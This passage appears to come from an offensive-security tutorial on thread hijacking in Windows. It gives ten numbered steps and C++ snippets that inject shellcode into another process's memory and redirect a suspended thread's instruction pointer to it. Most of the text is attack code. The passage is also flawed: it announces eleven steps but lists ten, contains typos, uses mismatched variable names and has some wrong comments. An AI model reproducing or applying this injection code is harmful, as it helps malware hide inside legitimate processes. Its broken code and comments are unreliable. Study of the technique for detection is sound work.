
At a high-level thread (execution) hijacking can be broken up into eleven steps:

1. Locate and open a target process to control.
2. Allocate memory region for malicious code.
3. Write malicious code to allocated memory.
4. Identify the thread ID of the target thread to hijack.
5. Open the target thread.
6. Suspend the target thread.
7. Obtain the thread context.
8. Update the instruction pointer to the malicious code.
9. Rewrite the target thread context.
10. Resume the hijacked thread.


```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
)) {
```


```cpp
if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}
```


```cpp
SuspendThread(hThread);
```

```cpp
CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread 
	&context // Pointer to store the context structure
);
```

```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
```


```cpp
SetThreadContext(
	hThread, // Handle for the thread 
	&context // Pointer to the context structure
);
```

```cpp
ResumeThread(
	hThread // Handle for the thread
);
```

